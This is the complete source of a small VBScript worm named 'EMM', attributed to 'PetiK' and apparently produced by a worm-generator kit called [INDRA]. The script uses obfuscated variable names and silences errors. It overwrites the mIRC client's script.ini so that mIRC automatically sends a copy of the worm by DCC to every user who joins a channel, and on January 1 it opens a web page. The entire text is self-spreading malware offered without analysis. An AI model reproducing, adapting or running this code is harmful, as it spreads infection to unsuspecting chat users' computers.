'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
gcwwtjhyavqrtxr = WScript.ScriptFullName
Set oylaoaiuygjgdib = CreateObject("WScript.Shell")
Set ccibwhjpkqeirsc = CreateObject("Scripting.FileSystemObject")
Set tbwmvcvaaepyget = ccibwhjpkqeirsc.CreateTextFile("C:\mirc\script.ini", True)
tbwmvcvaaepyget.WriteLine "[script]"
tbwmvcvaaepyget.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
tbwmvcvaaepyget.Write "n1=/dcc  send$nick """
tbwmvcvaaepyget.Write gcwwtjhyavqrtxr
tbwmvcvaaepyget.WriteLine """ }"
tbwmvcvaaepyget.Close
If (Month(Now) = 1) and (Day(Now) = 1) Then oylaoaiuygjgdib.Run "http://www.yahoo.fr"
'Generated with [INDRA] v0.4es.
